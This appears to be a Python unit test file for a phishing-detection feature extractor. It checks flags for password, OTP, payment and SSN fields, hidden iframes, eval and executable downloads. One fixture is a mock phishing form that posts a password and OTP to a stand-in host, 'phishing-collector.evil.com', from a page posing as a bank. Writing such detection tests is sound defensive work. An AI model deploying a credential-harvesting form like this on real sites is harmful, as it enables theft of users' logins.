import unittest
from ml.features.html_features import extract_html_features
from ml.features.form_features import extract_form_features


class TestHTMLFeatureExtraction(unittest.TestCase):

    def test_clean_webpage(self):
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Safe Example Company</title></head>
        <body>
            <h1>Welcome to our homepage</h1>
            <p>We build secure web applications.</p>
            <a href="/about">About Us</a>
            <a href="/contact">Contact</a>
        </body>
        </html>
        """
        feats = extract_html_features(html, "https://example.com")
        self.assertEqual(feats["has_password_field"], 0)
        self.assertEqual(feats["has_otp_field"], 0)
        self.assertEqual(feats["has_payment_field"], 0)
        self.assertEqual(feats["has_external_form_submit"], 0)
        self.assertEqual(feats["has_executable_download"], 0)
        self.assertEqual(feats["has_eval"], 0)
        self.assertGreater(feats["num_internal_links"], 0)

    def test_login_and_password_form(self):
        html = """
        <html>
        <head><title>Sign In</title></head>
        <body>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="Enter username">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Sign In</button>
            </form>
        </body>
        </html>
        """
        feats = extract_html_features(html, "https://example.com/login")
        self.assertEqual(feats["has_password_field"], 1)
        self.assertEqual(feats["has_username_field"], 1)
        self.assertEqual(feats["has_external_form_submit"], 0)

    def test_external_form_submission_domain_mismatch(self):
        html = """
        <html>
        <head><title>Account Verification</title></head>
        <body>
            <form action="https://phishing-collector.evil.com/harvest" method="POST">
                <input type="text" name="otp" placeholder="Enter 6-digit OTP">
                <input type="password" name="password">
                <input type="submit" value="Verify">
            </form>
        </body>
        </html>
        """
        feats = extract_html_features(html, "https://legitimate-bank.com/verify")
        self.assertEqual(feats["has_password_field"], 1)
        self.assertEqual(feats["has_otp_field"], 1)
        self.assertEqual(feats["has_external_form_submit"], 1)
        self.assertGreater(feats["form_domain_mismatch_count"], 0)

    def test_payment_and_cvv_form(self):
        html = """
        <html>
        <body>
            <form action="/checkout" method="POST">
                <input type="text" name="cardnumber" placeholder="Card Number">
                <input type="text" name="cvv" placeholder="CVV">
                <input type="text" name="ssn" placeholder="Social Security Number">
            </form>
        </body>
        </html>
        """
        feats = extract_html_features(html, "https://shop.com/checkout")
        self.assertEqual(feats["has_payment_field"], 1)
        self.assertEqual(feats["has_cvv_field"], 1)
        self.assertEqual(feats["has_personal_info_field"], 1)

    def test_suspicious_script_and_hidden_iframe(self):
        html = """
        <html>
        <body>
            <iframe src="https://ad-tracker.com" style="display:none; width:0px; height:0px;"></iframe>
            <a href="https://example.com/installer.exe">Download Update</a>
            <script>
                eval("console.log('test')");
                document.write("<span>injected</span>");
                document.oncontextmenu = function() { return false; };
            </script>
        </body>
        </html>
        """
        feats = extract_html_features(html, "https://example.com")
        self.assertEqual(feats["has_hidden_iframe"], 1)
        self.assertEqual(feats["has_eval"], 1)
        self.assertEqual(feats["has_document_write"], 1)
        self.assertEqual(feats["has_event_tampering"], 1)
        self.assertEqual(feats["has_executable_download"], 1)


if __name__ == "__main__":
    unittest.main()
